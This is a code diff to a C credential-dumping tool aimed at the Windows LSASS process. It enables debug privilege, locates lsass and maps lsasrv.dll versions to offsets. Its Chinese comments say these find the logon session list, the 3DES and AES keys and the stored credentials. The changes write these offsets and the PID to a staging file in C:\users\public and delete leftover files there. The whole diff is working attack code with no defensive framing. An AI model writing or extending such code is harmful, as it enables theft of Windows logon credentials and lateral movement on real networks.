@@ -55,6 +55,11 @@ DWORD offset_table[TABLE_LENGTH] = {
 	0x32BC3,
 	0x1FA63
 };
+
+DWORD _offset_table[TABLE_LENGTH][4] = {
+	  {0x32BC3,0x39E5C,0x9E36E,0x108},
+	  {0x1FA63,0x395DC,0x8CA6C,0x108}
+};
 void getosversion(char* result) {
 	char buffer[1024] = { 0 };
 	char PATH[1024] = "C:\\windows\\system32\\lsasrv.dll";
@@ -131,9 +136,25 @@ int GetLsvchostsassPid() {
 	return 0;
 }
 
-
 int main(int argc, char** argv)
 {
+	if (FBFileExists("C:\\users\\public\\3iaad")) {
+		DeleteFileA("C:\\users\\public\\3iaad");
+	}
+	if (FBFileExists("C:\\users\\public\\kiaad")) {
+		DeleteFileA("C:\\users\\public\\kiaad");
+	}
+	if (FBFileExists("C:\\users\\public\\ili6ao")) {
+		DeleteFileA("C:\\users\\public\\ili6ao");
+	}
+	if (FBFileExists("C:\\users\\public\\aiaad")) {
+		DeleteFileA("C:\\users\\public\\aiaad");
+	}
+
+
+		
+		
+		
 	EnableDebugPrivilege();
 	DWORD pid = GetLsassPid();
 	// 我需要先获取lsasrv.dll的版本信息，从而得到关键的3个符号的偏移量信息
@@ -157,6 +178,21 @@ int main(int argc, char** argv)
 			char write_out[123] = { 0 };
 			sprintf_s(write_out,123, "%03d", i);
 			sprintf_s(write_out+3,120, "%07d", pid);
+
+			// 我们从_offset_table中根据上面获取到的index，写入四个偏移量
+			// logonsessionlist、3des、aes、credential字段在logonsessionlist节点中的偏移
+			// 我们写入的结构为  3bytes 索引 （现在已经没啥用了，只不过我懒得改）
+			// 7字节lsass pid
+			// 偏移量的长度不会超过8字节，我们将其格式化为0填充的8位16进制字符串
+			// 8字节偏移量   4个一共占32字节
+
+			sprintf_s(write_out + 3 + 7, 123, "%08x", _offset_table[i][0]);
+			sprintf_s(write_out + 3 + 7 + 8, 123, "%08x", _offset_table[i][1]);
+			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, "%08x", _offset_table[i][2]);
+			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
+
+
+
 			FILE* fptr;
 			if (FBFileExists("C:\\users\\public\\ili6ao"))DeleteFileA("C:\\users\\public\\ili6ao");
 			// Open a file in writing mode
